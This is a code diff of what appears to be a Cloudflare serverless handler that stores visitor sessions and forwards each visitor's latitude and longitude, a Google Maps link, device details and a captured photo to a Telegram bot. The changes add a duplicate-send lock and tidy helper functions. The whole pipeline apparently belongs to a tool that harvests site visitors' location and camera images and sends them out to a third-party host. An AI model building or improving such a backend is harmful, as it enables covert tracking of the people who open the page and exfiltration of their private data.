@@ -17,9 +17,15 @@ export async function onRequestPost({ request, env }) {
 
     await env.VISITOR_KV.put(id, JSON.stringify(session));
 
-    // send only on final
+    // ✅ PREVENT DUPLICATE TELEGRAM
     if (body.event === "final") {
-      await safeTelegram(env, session);
+      const key = `sent_${id}`;
+      const already = await env.VISITOR_KV.get(key);
+
+      if (!already) {
+        await safeTelegram(env, session);
+        await env.VISITOR_KV.put(key, "1", { expirationTtl: 300 }); // 5 min lock
+      }
     }
 
     return new Response(JSON.stringify({ ok: true }), {
@@ -70,6 +76,7 @@ async function safeTelegram(env, s) {
 // TELEGRAM MAIN
 // =======================
 async function sendTelegram(env, s) {
+
   const map = s.lat && s.lng
     ? `https://maps.google.com/?q=${s.lat},${s.lng}`
     : "N/A";
@@ -91,39 +98,18 @@ Lat: ${s.lat || "-"}
 Lng: ${s.lng || "-"}
 
 🔗 <a href="${map}">Open Map</a>
+
+${s.error ? `\n❌ <b>Error:</b> ${s.error}` : ""}
 `;
-  
-function formatTime(t) {
-  return new Date(t).toLocaleString("en-IN", {
-    timeZone: "Asia/Kolkata"
-  });
-}
 
-function shortDevice(ua = "") {
-  if (ua.includes("Android")) return "Android Mobile";
-  if (ua.includes("iPhone")) return "iPhone";
-  if (ua.includes("Windows")) return "Windows PC";
-  return "Unknown Device";
-}
-
-function getBrowser(ua = "") {
-  if (ua.includes("Chrome")) return "Chrome";
-  if (ua.includes("Safari")) return "Safari";
-  if (ua.includes("Firefox")) return "Firefox";
-  return "Unknown";
-}
-
-  if (s.image && s.image.length > 600000) {
-  console.log("Image too big → compressing fallback");
-  return await sendText(env, text);
-}
-  
-  // IMAGE PATH
+  // ===================
+  // IMAGE HANDLING
+  // ===================
   if (s.image && s.image.startsWith("data:image")) {
 
-    // avoid oversized payload
+    // ✅ size protection (single rule)
     if (s.image.length > 700000) {
-      console.log("Image too large → fallback to text");
+      console.log("Image too large → sending text only");
       return await sendText(env, text);
     }
 
@@ -146,6 +132,8 @@ function getBrowser(ua = "") {
     if (!result.ok) {
       throw new Error("Telegram photo error: " + JSON.stringify(result));
     }
+
+    return result;
 
   } else {
     return await sendText(env, text);
@@ -173,4 +161,28 @@ async function sendText(env, text) {
   }
 
   return result;
+}
+
+
+// =======================
+// HELPERS (OUTSIDE)
+// =======================
+function formatTime(t) {
+  return new Date(t).toLocaleString("en-IN", {
+    timeZone: "Asia/Kolkata"
+  });
+}
+
+function shortDevice(ua = "") {
+  if (ua.includes("Android")) return "Android Mobile";
+  if (ua.includes("iPhone")) return "iPhone";
+  if (ua.includes("Windows")) return "Windows PC";
+  return "Unknown Device";
+}
+
+function getBrowser(ua = "") {
+  if (ua.includes("Chrome")) return "Chrome";
+  if (ua.includes("Safari")) return "Safari";
+  if (ua.includes("Firefox")) return "Firefox";
+  return "Unknown";
 }
